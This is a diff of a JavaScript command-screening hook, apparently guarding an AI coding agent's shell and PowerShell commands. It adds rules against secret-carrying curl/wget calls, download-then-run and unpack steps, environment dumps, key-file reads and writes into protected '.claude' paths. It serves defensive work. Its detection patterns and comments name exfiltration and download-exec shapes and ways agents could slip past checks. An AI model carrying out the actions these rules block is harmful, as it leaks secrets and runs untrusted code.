+  if (where && /(?:^|[\\/])\.(?:git|claude)(?:[\\/]|$)/i.test(dest ? dest.text : '')) return false;
+  return !downloaded || (!!dest && !!where && path.resolve(where) !== path.resolve(projectDir));
 }
 // git subcommands that only read (or stage) the paths they name: a plain reader unless `--output`.
 function gitReads(toks) {
@@ -4174,8 +4349,11 @@ function noteCd(st, vals) {
   if (st.type !== 'simple' || !st.words.length) return;
   const ws = /^(?:builtin|command)$/.test(st.words[0].text) ? st.words.slice(1) : st.words;
   if (!ws.length || !/^(?:cd|pushd)$/.test(ws[0].text)) return;
-  const a = ws.find((w, k) => k > 0 && !/^-[LPe@]+$/.test(w.text));
-  const ts = !a ? [] : a.lit ? [a.text] : subst(a.text, vals) || [a.text];
+  const a = ws.find((w, k) => k > 0 && !/^-[LPe@]+$/.test(w.text) && !(w.text === '--' && ws[k + 1]));
+  let ts = !a ? [] : a.lit ? [a.text] : subst(a.text, vals) || [a.text];
+  // A loop over a relative glob (`for d in packages/*; do (cd "$d" && npm test); done`): the directories it matches.
+  const gv = a && ts.every((t) => t.includes('$')) && /^\$\{?([A-Za-z_]\w*)\}?$/.exec(a.text), gl = gv && vals.get(' glob:' + gv[1]);
+  if (gl && gl.length && gl.every((g) => !/^(?:[~\\/]|[A-Za-z]:)|(?:^|[\\/])\.\.(?:[\\/]|$)/.test(g))) ts = gl;
   if (ts.some((t) => t.split(/[\\/]/).some((c) => /^\.claude$/i.test(c) || claudeGlob(c)))) cdProtected = true;
   const sub = a && a.text === '$(_)' && a.subs.length === 1 && a.subs[0].items.length === 1 && a.subs[0].items[0].stages;
   if (sub && sub.length === 1 && (sub[0].words || []).map((w) => w.lit && w.text).join(' ') === 'git rev-parse --show-toplevel') return;   // the project's own repository root
@@ -4291,6 +4469,9 @@ function approveArgv(words, vals, depth, approvedScripts) {
   if (/^(?:curl|wget)$/.test(w0) && words.some((w) => (!w.lit && /\$\{?[A-Za-z_]/.test(w.text)) || w.text === '_derived_')) return false;   // a variable can carry a secret out
   if (runnerUnsafe(words)) return false;
   if (wroteCode && isRunner(stageProgram(words))) return false;   // it can run what this command just wrote
+  if (runnerDefHigh(words)) return false;
+  if (unpacked && stageProgram(words) === 'git') return false;   // an archive member `.git/config` or `.git/hooks/x` runs on git
+  if (/^(?:tar|bsdtar|unzip)$/.test(w0) && !unpackSafe(words)) return false;
   if (w0 === 'curl' && !curlSafe(words)) return false;
   if (w0 === 'wget' && !wgetSafe(words)) return false;
   if (w0 === 'gh' && ghApiWrites(toks)) return false;
@@ -4338,6 +4519,8 @@ function approveStage(st, vals, depth, approvedScripts) {
     return args.some((w) => !w.text.startsWith('-')) && args.every((w) =>
       /^[A-Za-z_]\w*=/.test(w.text) || /^-[A-Za-z]+$/.test(w.text) || (/^[A-Za-z_]\w*$/.test(w.text) && !secretVarName(w.text)));
   }
+  // `printenv PATH`: named variables only, none secret-shaped (bare printenv dumps them all).
+  if (w0 === 'printenv') return st.words.length > 1 && st.words.slice(1).every((w) => w.lit && /^[A-Za-z_]\w*$/.test(w.text) && !secretVarName(w.text.toUpperCase()));
   return argvVariants(st.words, vals).every((ws) => approveArgv(ws, vals, depth, approvedScripts));
 }
 // A substitution that can only print integers: `grep -n X FILE | cut -d: -f1`, `grep -c X FILE`,
@@ -4420,26 +4603,40 @@ function arithOk(ast, t) {
   if (!(ast.arith || []).every((e) => /^[\w\s+\-*\/%<>=!&|^~?:,()$]*$/.test(e) && (e.match(/[A-Za-z_]\w*/g) || []).every((n) => intName(t, n)))) return false;
   return (ast.intSubs || []).every((sub) => intProducer(sub, new Map()));
 }
+// `curl URL | tar x`: what the next stage reads is a download.
+const pipedDownload = (prev) => !!prev && prev.type === 'simple' && /^(?:curl|wget)$/.test(stageProgram(prev.words));
 function approveAst(ast, vals, depth, approvedScripts) {
   const t = nameTypes(ast);
   if (!arithOk(ast, t)) return false;
   const saved = outerTypes, savedCd = cdProtected, savedNamed = claudeNamed, savedAp = approving, savedDir = cdDir;
   outerTypes = t; approving = true;
-  if (!depth) { cdDir = projectDir; wroteCode = false; }
   // A write whose content this hook cannot read into a file that defines commands (package.json scripts, a
-  // Makefile, build.rs), or a tool that downloads, unpacks or patches files. Readable content was scanned
-  // by the write pass (writtenContent).
-  const noteWrite = (st, v) => {
+  // Makefile, build.rs), code from outside the project into a file a runner loads (a test, a config), or a
+  // tool that downloads, unpacks or patches files. Readable content was scanned by the write pass.
+  const noteWrite = (st, v, prev) => {
     if (st.type !== 'simple') return;
     const prog = stageProgram(st.words);
     const ts = /^(?:rm|chmod|touch|mkdir)$/.test(prog) ? [] : writeTargets(st, v);
-    if (writtenContent(st) === null && ts.some((t) => t.includes('$') || CMD_DEF.test(t))) wroteCode = true;
+    const body = writtenContent(st);
+    if (body === null && ts.some((t) => t.includes('$') || CMD_DEF.test(t) || (CODE_FILE.test(t) && (foreignWrite(st, ts, v) || (prev && foreignWrite(prev, [], v)))))) wroteCode = true;
+    // A literal Makefile or package.json: each command it defines must approve on its own (`all:\n\t@npm publish`).
+    if (body !== null && ts.some((t) => CMD_DEF.test(t) && (prog === 'sed' || !definedCommandsOk(t, body, v, depth)))) wroteCode = true;
     if (ts.some((t) => BIN_DIR.test(t))) wroteCode = true;   // a runner execs these directly, whatever they hold
-    const curlSaves = prog === 'curl' && st.words.some((w, k) => /^-[A-Za-z]*O|^--remote-name|^-o.|^--output=/.test(w.text) ||
-      (/^(?:-[A-Za-z]*o|--output)$/.test(w.text) && (st.words[k + 1] || {}).text !== '/dev/null'));
-    if (/^(?:patch|unzip|tar|wget)$/.test(prog) || curlSaves || (prog === 'git' && /^(?:apply|am)$/.test((st.words[1] || {}).text))) wroteCode = true;
+    const curlSaves = prog === 'curl' && (st.words.some((w, k) => /^-[A-Za-z]*O|^--remote-name|^-o.|^--output=/.test(w.text) ||
+      (/^(?:-[A-Za-z]*o|--output)$/.test(w.text) && (st.words[k + 1] || {}).text !== '/dev/null')) || ts.some((t) => t !== '/dev/null'));
+    if (curlSaves || prog === 'wget') downloaded = true;
+    if (/^(?:7z|7za|cpio)$/.test(prog) || (/^(?:unzip|tar|bsdtar)$/.test(prog) && isExtract(st.words.slice(st.words.findIndex((w) => base(w.text) === prog))))) unpacked = true;
+    if (/^(?:patch|unzip|tar|bsdtar|7z|7za|cpio|wget)$/.test(prog) || curlSaves || (prog === 'git' && /^(?:apply|am)$/.test((st.words[1] || {}).text))) wroteCode = true;
   };
-  try { return walk(ast, vals, (p, v) => p.stages.every((st) => { noteCd(st, v); const ok = approveStage(st, v, depth, approvedScripts); noteWrite(st, v); return ok; }), false); }
+  if (!depth) {
+    cdDir = projectDir; wroteCode = downloaded = unpacked = false;
+    // A loop, trap or function can run a runner after a write that comes later in the text
+    // (`for i in 1 2; do npm test; cp /tmp/x package.json; done`): there every write counts from the start.
+    let compound = false;
+    walk(ast, new Map(vals), (p, v) => { p.stages.forEach((st, i) => { if (st.type !== 'simple' || /^(?:trap|function)$/.test((st.words[0] || {}).text)) compound = true; noteWrite(st, v, p.stages[i - 1]); }); return true; }, false);
+    wroteCode = wroteCode && compound; downloaded = downloaded && compound; unpacked = unpacked && compound; cdDir = projectDir;
+  }
+  try { return walk(ast, vals, (p, v) => p.stages.every((st, i) => { noteCd(st, v); if (pipedDownload(p.stages[i - 1])) downloaded = true; const ok = approveStage(st, v, depth, approvedScripts); noteWrite(st, v, p.stages[i - 1]); return ok; }), false); }
   finally { outerTypes = saved; cdProtected = savedCd; claudeNamed = savedNamed; approving = savedAp; if (depth) cdDir = savedDir; }   // a write in `sh -c` or a subshell stays written
 }
 
@@ -4457,6 +4654,7 @@ const envTaints = (name) => !ENV_SAFE.test(name) && (ENV_LOADER.test(name) || EN
 function envOk(envs, w0) {
   for (const e of envs) {
     if (e.name === 'PATH') { if (!e.raw.split(':').every((p) => PATH_PART.test(p))) return false; continue; }
+    if (/^npm_config_/i.test(e.name)) return false;   // npm reads each as a flag (`script_shell`, `node_options`)
     if (e.name === 'NODE_OPTIONS') { if (!/^(?:--max-old-space-size=\d+|--no-warnings|--enable-source-maps|--experimental-vm-modules|--use-system-ca)?$/.test(e.raw)) return false; continue; }
     if (ENV_LOADER.test(e.name)) return false;
     if (ENV_SAFE.test(e.name)) continue;
@@ -4586,13 +4784,23 @@ const CURL_BOOL = /^(?:-[sSLIifvkgG46#O]+|--(?:remote-name|remote-name-all|silen
 const CURL_VAL = /^(?:-[sSLifvk]*[oXHmAew]|--(?:output|request|header|max-time|connect-timeout|user-agent|referer|write-out|retry|retry-delay|retry-max-time|url|data|data-raw|json|data-urlencode))$/;
 // `-O` saves under the remote name: only data or an archive, never a script, a binary or a command definition.
 const SAVED_DATA = /\.(?:tgz|tar|gz|xz|bz2|zst|zip|7z|txt|md|csv|tsv|log|png|jpe?g|gif|svg|webp|ico|pdf|html?|xml|json|ya?ml|toml)$/i;
+// The file `-O` writes, in the directory a `cd` went to: not a command definition, an agent-instruction file,
+// a dotfile or a file under a dot directory of the project (`.github/workflows`, `.vscode`), nor anything
+// in the home `.claude` (the hook's cwd can be `~/.claude`).
+function remoteNameSafe(name) {
+  if (cdDir === null || !name || CMD_DEF.test(name) || scan.isAgentInstructionFile(name)) return false;
+  const abs = path.join(cdDir, name), rel = path.relative(projectDir, abs);
+  const home = path.relative(safeHomedir(), abs);   // `~/.config/gh/hosts.yml`, `~/.docker/config.json`
+  if (protectedWrite(abs) || (!home.startsWith('..') && !path.isAbsolute(home) && /^\.|[\\/]\./.test(home))) return false;
+  return rel.startsWith('..') || path.isAbsolute(rel) || !/(?:^|[\\/])\./.test(rel);
+}
 function curlSafe(words) {
   const remoteName = words.some((w) => /^-[A-Za-z#]*O[A-Za-z#]*$|^--remote-name/.test(w.text));
   for (let k = 1; k < words.length; k++) {
     const t = words[k].text;
     if (!t.startsWith('-')) {                                  // URL
-      const u = t.replace(/[?#].*$/, '');
-      if (remoteName && (!SAVED_DATA.test(u) || CMD_DEF.test(u))) return false;
+      const u = t.replace(/[?#].*$/, ''), name = u.replace(/^.*\//, '');
+      if (remoteName && (!SAVED_DATA.test(u) || !remoteNameSafe(name))) return false;
       continue;
     }
     if (CURL_BOOL.test(t)) continue;
@@ -4924,30 +5132,48 @@ function checkSegmentScript(seg, rawCmd, cwd, isPosh, approvedScriptSegs) {
   flagRisk(buildRiskReason(abs, shape.token, findings, r.truncated, __dirname), seg);
 }
 
-// The paths a PowerShell stage writes, deletes or moves: every argument of a writing cmdlet but the
-// `-Value`, and only the destination of a copy. Home spellings become `~`.
-const POSH_WRITE = /^(?:Remove-Item|ri|rm|rmdir|del|erase|rd|Set-Content|sc|Add-Content|ac|Out-File|Clear-Content|clc|New-Item|ni|Move-Item|mi|move|mv|Rename-Item|rni|ren|Tee-Object|tee|Copy-Item|cpi|copy|cp)$/i;
-const poshTokens = (stage) => stage.trim().match(/(?:'[^']*'|"[^"]*"|[^\s'"><])+|\d?\*?>>?\s*/g) || [];
+// The paths a PowerShell stage writes, deletes or moves: every argument of every writing cmdlet in it
+// (`& { Remove-Item x }`, `% { Set-Content x }` too) but the content, and only the destination of a copy.
+// A parameter may be abbreviated or colon-bound (`-Dest x`, `-Path:x`); an unknown one's value counts as a
+// path (fail closed). Home spellings become `~`.
+const POSH_WRITE = /^(?:Remove-Item|ri|rm|rmdir|del|erase|rd|Set-Content|sc|Add-Content|ac|Out-File|Clear-Content|clc|New-Item|ni|Move-Item|mi|move|mv|Rename-Item|rni|ren|Tee-Object|tee|Copy-Item|cpi|copy|cp|Expand-Archive|Set-Item|si)$/i;
+const POSH_REDIR = /^\d?\*?>>?$/;
+const poshTokens = (stage) => (stage.trim().match(/(?:'[^']*'|"[^"]*"|[^\s'"><{}()&])+|\d?\*?>>?|[{}()&]/g) || [])
+  .flatMap((t) => { const m = /^(-[A-Za-z]+):(.+)$/.exec(t); return m ? [m[1], m[2]] : [t]; });
 const poshPath = (t) => t.replace(/^['"]|['"]$/g, '').replace(/^(?:\$env:USERPROFILE|\$\{env:USERPROFILE\}|\$env:HOME|\$HOME)(?=[\\/]|$)/i, '~');
-function poshWriteTargets(stage) {
+// `-Dest` is `-Destination`: a parameter is any prefix of its name.
+const poshParam = (t, ...names) => /^-[A-Za-z]+$/.test(t) && names.some((n) => n.toLowerCase().startsWith(t.slice(1).toLowerCase()));
+const POSH_SWITCH = /^-(?:Force|Recurse|Append|NoNewline|NoClobber|Confirm|WhatIf|PassThru|Verbose|Debug)$/i;
+const POSH_FILE_API = /\[(?:System\.)?IO\.(?:File|Directory)\]::(\w+)\s*\(\s*(['"])(.*?)\2(?:\s*,\s*(['"])(.*?)\4)?/gi;
+function poshWriteTargets(stage, prev) {
   const toks = poshTokens(stage), out = [];
-  for (let k = 0; k < toks.length; k++) if (/>/.test(toks[k]) && toks[k + 1]) out.push(toks[++k]);   // `> f`, `*>> f`, `2> f`
-  const cmd = toks.filter((t, k) => !/>/.test(t) && !/>/.test(toks[k - 1] || ''));
-  if (POSH_WRITE.test(cmd[0] || '')) {
-    const args = [];
-    let dest = null;
-    for (let k = 1; k < cmd.length; k++) {
-      if (/^-Destination$/i.test(cmd[k])) { dest = cmd[++k]; continue; }
-      if (/^-(?:Path|LiteralPath|FilePath|NewName)$/i.test(cmd[k])) { args.push(cmd[++k]); continue; }
-      if (/^-[A-Za-z]+$/.test(cmd[k]) && !/^-(?:Force|Recurse|Append|NoNewline|NoClobber|Confirm|WhatIf|PassThru|Verbose|Debug)$/i.test(cmd[k])) { k++; continue; }   // -Value x, -Encoding x
-      if (!cmd[k].startsWith('-')) args.push(cmd[k]);
+  for (let k = 0; k < toks.length; k++) if (POSH_REDIR.test(toks[k]) && toks[k + 1]) out.push(toks[++k]);   // `> f`, `*>> f`, `2> f`
+  const cmd = toks.filter((t, k) => !POSH_REDIR.test(t) && !POSH_REDIR.test(toks[k - 1] || ''));
+  for (let at = 0; at < cmd.length; at++) {
+    if (!POSH_WRITE.test(cmd[at])) continue;
+    const name = cmd[at], mkItem = /^(?:New-Item|ni)$/i.test(name);
+    let args = [], dest = null, child = null, k = at + 1;
+    for (; k < cmd.length && !/^[{}()&]$/.test(cmd[k]) && !POSH_WRITE.test(cmd[k]); k++) {
+      const t = cmd[k];
+      if (poshParam(t, 'Destination', 'DestinationPath')) { dest = cmd[++k]; continue; }
+      if (mkItem && poshParam(t, 'Name')) { child = cmd[++k]; continue; }
+      if (POSH_SWITCH.test(t)) continue;
+      if (/^-[A-Za-z]+$/.test(t)) { if (!poshParam(t, 'Value', 'InputObject', 'Encoding', 'ItemType', 'Stream', 'Width', 'Filter', 'Include', 'Exclude')) args.push(cmd[k + 1]); k++; continue; }
+      args.push(t);
     }
-    // A copy writes only its destination: `-Destination`, else the last positional.
-    out.push(...(/^(?:Copy-Item|cpi|copy|cp)$/i.test(cmd[0]) ? (dest ? [dest] : args.slice(-1)) : dest ? [...args, dest] : args));
+    if (mkItem && child) args = args.length ? args.map((a) => poshPath(a || '') + '/' + poshPath(child)) : [child];
+    // `Get-Item X | Remove-Item`: the piped item is the target.
+    if (!args.length && !dest && prev) args = poshTokens(prev).filter((t) => /[\\/.~]/.test(t) && !t.startsWith('-'));
+    out.push(.../^(?:Copy-Item|cpi|copy|cp)$/i.test(name) ? (dest ? [dest] : args.slice(-1)) : dest ? [...args, dest] : args);
+    at = k - 1;
+  }
+  // A copy writes its destination; a move or replace changes both paths; any other non-read call its first.
+  for (const m of stage.matchAll(POSH_FILE_API)) {
+    if (/^(?:Read|Exists|Get|Enumerate|Open(?:Read|Text)?$)/i.test(m[1])) continue;
+    out.push(...(/^Copy$/i.test(m[1]) ? [m[5]] : /^(?:Move|Replace)$/i.test(m[1]) ? [m[3], m[5]] : [m[3]]));
   }
   return out.filter(Boolean).map(poshPath);
 }
-
 // Injection scan for content written through the shell (`echo/printf ... > file`).
 // The Write/Edit tools get this scan in check-sensitive-files; the shell redirect
 // path did not, so identical payloads slipped through. Extraction is approximate
@@ -4957,20 +5183,28 @@ function poshWriteTargets(stage) {
 // -Path / -Value in any order, the content piped in from the previous stage, or `TEXT > FILE`.
 function poshContentWrite(stage, prev) {
   const toks = poshTokens(stage);
-  const r = toks.findIndex((t) => />/.test(t));
+  const r = toks.findIndex((t) => POSH_REDIR.test(t));
   if (r > 0 && toks[r + 1]) return [toks.slice(/^(?:echo|Write-Output|Write-Host)$/i.test(toks[0]) ? 1 : 0, r).join(' '), toks[r + 1]];
-  if (!/^(?:Add-Content|Set-Content|ac|sc|Out-File)$/i.test(toks[0] || '')) return null;
-  let path = null, value = null;
-  const pos = [];
-  for (let k = 1; k < toks.length; k++) {
-    if (/^-(?:Path|LiteralPath|FilePath)$/i.test(toks[k])) path = toks[++k];
-    else if (/^-(?:Value|InputObject)$/i.test(toks[k])) value = toks[++k];
-    else if (/^-(?:Encoding|Width|Stream)$/i.test(toks[k])) k++;
-    else if (!toks[k].startsWith('-')) pos.push(toks[k]);
+  const at = toks.findIndex((t) => /^(?:Add-Content|Set-Content|ac|sc|Out-File)$/i.test(t));
+  if (at >= 0) {
+    let path = null, value = null;
+    const pos = [];
+    for (let k = at + 1; k < toks.length && !/^[{}()&]$/.test(toks[k]); k++) {
+      if (poshParam(toks[k], 'Path', 'LiteralPath', 'FilePath', 'PSPath')) path = toks[++k];
+      else if (poshParam(toks[k], 'Value', 'InputObject')) value = toks[++k];
+      else if (poshParam(toks[k], 'Encoding', 'Width', 'Stream')) k++;
+      else if (!toks[k].startsWith('-')) pos.push(toks[k]);
+    }
+    path = path || pos.shift();
+    value = value || pos.shift() || prev;
+    if (path && value && value !== '$_') return [value, path];
   }
-  path = path || pos.shift();
-  value = value || pos.shift() || prev;
-  return path && value ? [value, path] : null;
+  // Any other write (`New-Item -Value`, `Tee-Object`, `% { Add-Content F $_ }`, `[IO.File]::AppendAllText`)
+  // naming an agent-instruction file: every other word of the stage, and the piped-in text, is content.
+  if (!toks.some((t) => POSH_WRITE.test(t)) && !/\[(?:System\.)?IO\.File\]::(?:Write|Append)/i.test(stage)) return null;
+  const words = stage.match(/'[^']*'|"[^"]*"|[^\s'"(),{}]+/g) || [];
+  const f = words.find((w) => scan.isAgentInstructionFile(poshPath(w)));
+  return f ? [[prev || '', ...words.filter((w) => w !== f)].map((w) => w.trim().replace(/^(['"])([\s\S]*)\1$/, '$2')).join(' '), f] : null;
 }
 
 function scanShellRedirectInjection(seg, isPosh, prev) {
@@ -5070,6 +5304,21 @@ if (MAIN) watchdog.input((data) => {
   for (let i = 0; i < segments.length; i++) {
     checkSegmentDeny(segments[i], 0, 'hard', expanded[i]);
   }
+  // A key a test suite ships (`tests/fixtures/x.pem`) is exempt from the secret-read deny only while it is the
+  // project's own file: after a directory change or a link in the command, or when it resolves outside the
+  // project (a symlink), it denies. It is never auto-approved. Only a stage that can read it counts: a lister
+  // or a git path argument (`ls fixtures/*.pem`, `git add tests/ca.pem`) does not.
+  const KEY_LISTER = /^\s*(?:ls|dir|Get-ChildItem|gci|stat|test|\[|realpath|readlink|basename|dirname|git\s+(?:add|rm|mv|status|ls-files|check-ignore))(?=\s|$)/i;
+  const keyStages = segments.flatMap((s) => splitPipeStages(s)).filter((s) => !KEY_LISTER.test(s) || /[$`<>]/.test(s)).join('\n');
+  const fixtureKeys = [...new Set(keyStages.match(/(?<![^\s'"|;&<>()`])[^\s'"|;&<>()`]*\.(?:pem|key)\b/gi) || [])].filter((t) => !SECRET_TOKENS_RE.test(t));
+  if (fixtureKeys.length) {
+    let realCwd = cwd;
+    try { realCwd = fs.realpathSync(cwd); } catch (_) { /* keep cwd */ }
+    const realIn = (p) => { try { return inside(realCwd, fs.realpathSync(path.resolve(cwd, p))); } catch (_) { return true; } };
+    if (/(?:^|[\s;&|({`])(?:cd|pushd|popd|ln|Set-Location|sl|chdir|Push-Location|New-Item|ni|mklink|subst|mount|bindfs)(?=\s|$)/i.test(rawCmd) || !fixtureKeys.every(realIn)) {
+      deny('Reading sensitive file via shell blocked', fixtureKeys[0]);
+    }
+  }
 
   // Heredoc-blind view: bodies blanked, so its quoting is clean (in the full text a body holding an
   // odd `"` can swallow the next command). It gets its own deny passes, as do substitution bodies.
@@ -5104,7 +5353,7 @@ if (MAIN) watchdog.input((data) => {
   const hostSeed = () => {
     const m = new Map();
     try {
-      for (const [k, v] of [['HOME', safeHomedir()], ['PWD', cwd], ['TMPDIR', os.tmpdir()], ['USER', os.userInfo().username],
+      for (const [k, v] of [['HOME', safeHomedir()], ['PWD', cwd], ['CLAUDE_PROJECT_DIR', process.env.CLAUDE_PROJECT_DIR || cwd], ['TMPDIR', os.tmpdir()], ['USER', os.userInfo().username],
         ...['TEMP', 'TMP', 'APPDATA', 'LOCALAPPDATA', 'USERPROFILE'].map((k) => [k, process.env[k]])]) {
         if (typeof v === 'string' && v) m.set(k, [v]);
       }
@@ -5148,17 +5397,33 @@ if (MAIN) watchdog.input((data) => {
       // `Set-Location X` resolves; one this pass cannot read makes the directory unknown, and a relative
       // write then counts by its basename (as `cd` does for bash).
       let dir = cwd;
-      for (const seg of segments) for (const stage of splitPipeStages(seg)) {
+      for (const seg of segments) for (const [i, stage, all] of splitPipeStages(seg).map((s, i, a) => [i, s, a])) {
         const toks = poshTokens(stage);
         if (/^(?:Set-Location|sl|cd|chdir|Push-Location|pushd|Pop-Location|popd)$/i.test(toks[0] || '')) {
-          const a = toks.slice(1).filter((t) => !/^-(?:Path|LiteralPath|PassThru)$/i.test(t));
+          const a = toks.slice(1).filter((t) => !t.startsWith('-'));
           const t = a.length === 1 ? poshPath(a[0]) : null;
-          dir = dir && t && !t.includes('$') && !/^(?:Pop-Location|popd)$/i.test(toks[0]) ? hostPath(t, dir) : null;
+          // A variable: unknown. A wildcard (`cd ~/.claud?/hooks`): the `.claude` directory it can reach, else unknown.
+          const g = dir && t && !t.includes('$') && /[*?[]/.test(t) ? globPaths(hostPath(t, dir)) : null;
+          dir = g ? g.find((p) => /[\\/]\.claude(?:[\\/]|$)/i.test(p)) || null
+            : dir && t && !/[$*?[]/.test(t) && !/^(?:Pop-Location|popd)$/i.test(toks[0]) ? hostPath(t, dir) : null;
           continue;
         }
-        for (const t of poshWriteTargets(stage)) {
-          const rel = !/^[~\\/]|^[A-Za-z]:/.test(t);
-          const hit = protectedWrite(hostPath(t, dir || cwd), rel && (!dir || t.includes('$')));
+        for (const t of poshWriteTargets(stage, i ? all[i - 1] : null)) {
+          const rel = !/^[~\\/]|^[A-Za-z]:/.test(t), abs = hostPath(t, dir || cwd), baseOnly = rel && (!dir || t.includes('$'));
+          let hit = protectedWrite(abs, baseOnly);
+          // A delete, move or write into the home `.claude`, its hooks or plugins directory reaches shellter's files.
+          // A copy into one writes `<dir>/<source name>`: that file is what is judged (bash `cp` does the same).
+          if (!/^\s*(?:New-Item|ni)\s/i.test(stage) && /^(?:hooks|plugins)?$/i.test(path.relative(path.join(safeHomedir(), '.claude'), abs))) {
+            const copy = /^(?:Copy-Item|cpi|copy|cp)$/i.test(toks[0] || '');
+            const srcs = copy ? toks.slice(1).filter((x) => !x.startsWith('-')).map(poshPath).filter((x) => x !== t) : [];
+            hit = !copy ? 'deny' : srcs.some((x) => /[$*?[`]/.test(x) || !path.basename(x)) ? hit
+              : srcs.map((x) => protectedWrite(path.join(abs, path.basename(x)), false)).reduce((a, h) => a === 'deny' || h === 'deny' ? 'deny' : a || h, hit);
+          }
+          if (/[*?[]/.test(t) && hit !== 'deny') {   // a wildcard: every protected name it can match
+            const cands = globPaths(abs);
+            if (!cands) hit = abs.split(/[\\/]/).some((c) => /^\.claude$/i.test(c) || claudeGlob(c)) ? 'deny' : hit;
+            else for (const c of cands) { const h = protectedWrite(c, baseOnly); if (h === 'deny' || !hit) hit = h || hit; }
+          }
           if (hit === 'deny' && mode === 'hard') deny('Writing shellter\'s own trust store or installed files blocked', t);
           if (hit === 'ask' && mode === 'ask') ask('Writing Claude Code settings or a shell rc file -- approve only if intended', t);
         }
@@ -5184,7 +5449,7 @@ if (MAIN) watchdog.input((data) => {
         const globs = new Set(), targets = writeTargets(st, v, globs);
         // Written content a later command can run: the Write tool's shell scan (secret upload, download-exec).
         const body = mode === 'hard' && targets.length ? writtenContent(st) : null;
-        if (body && scan.hasHigh(scan.scanShell(body))) deny('Writing a secret upload or download-exec command to a file blocked', targets[0]);
+        if (body) for (const t of targets) noteHighWrite(t, body);
         for (const t of targets) {
           const abs = path.resolve(dir, t.replace(/^~(?=[\\/]|$)/, home));
           const baseOnly = (!known || t.includes('$')) && !/^[~\\/]|^[A-Za-z]:/.test(t) || /^\$/.test(t);
@@ -5205,6 +5470,21 @@ if (MAIN) watchdog.input((data) => {
     });
   };
   writePass('hard');
+  // Write-then-run: a runner, a shell or interpreter, or the written file itself runs in the same command.
+  if (highWrites.length) {
+    // Unparsed: a runner or shell word at a command start.
+    let runs = !ast && /(?:^|[;&|\n(]\s*)(?:sudo\s+)?(?:make|npm|pnpm|yarn|npx|bun|cargo|go|pytest|python\d*|node|bash|sh|zsh|source|\.\s|\.\/)/.test(work);
+    astWalk((p) => {
+      for (const st of p.stages) {
+        if (st.type !== 'simple' || !st.words.length) continue;
+        const prog = stageProgram(st.words);
+        if (isRunner(prog) || /^(?:sh|bash|zsh|dash|ksh|ash|fish|source|\.|python[\d.]*|py|node|deno|bun|perl|ruby|php|pwsh|powershell|eval|exec)$/.test(prog) ||
+          highWrites.some((t) => base(t) === prog)) runs = true;
+      }
+      return true;
+    });
+    if (runs) deny('Writing a secret upload or download-exec command to a file and running it blocked', highWrites[0]);
+  }
 
   // Injection scan for shell-redirected writes (bash-only), per pipe stage so a
   // later-stage `echo … > f` (or a trailing `| cat`) is still seen. deny()+exit on a hit.
@@ -5258,10 +5538,12 @@ if (MAIN) watchdog.input((data) => {
         ') -- approve only if you know what it does', rawCmd);
   }
 
+  // A download-exec installer line written to a file that defines commands: not denied, never approved.
+  const cmdDefHigh = highWrites.some((t) => CMD_DEF.test(t));
   // Bash approve: only a command the parser fully read, judged on its argv by one walker.
   if (!isPosh) {
     let ok = false;
-    if (ast && !bodyHigh && !secretVarRef(unexpanded(rawCmd))) {
+    if (ast && !bodyHigh && !cmdDefHigh && !fixtureKeys.length && !secretInText(rawCmd) && !ENV_DUMP.test(rawCmd)) {
       const approvedCanon = new Set();
       for (const sg of approvedScriptSegs) {
         const a = parseBash(sg);
@@ -5280,7 +5562,7 @@ if (MAIN) watchdog.input((data) => {
   let approveSegs = poshView === null ? [] : segments;
   if (poshView !== null && poshView !== work) { approveSegs = splitPoshSegments(poshView.replace(/\n/g, ' ; ')); expandSegments(approveSegs, cwd, true); }
   // A secret-shaped variable or a whole-environment dump (`Get-ChildItem Env:`) puts secrets in the transcript.
-  let allApproved = poshView !== null && approveSegs.length > 0 && !secretVarRef(unexpanded(rawCmd)) && !/(?<![\w$])env:(?!\\?[A-Za-z_])|GetEnvironmentVariables/i.test(rawCmd);
+  let allApproved = poshView !== null && approveSegs.length > 0 && !fixtureKeys.length && !cmdDefHigh && !secretInText(rawCmd) && !POSH_ENV_DUMP.test(rawCmd);
   for (let i = 0; allApproved && i < approveSegs.length; i++) {
     const seg = approveSegs[i];
     if (!approvedScriptSegs.has(seg) && !checkSegmentApprove(seg, 0, isPosh, i)) {
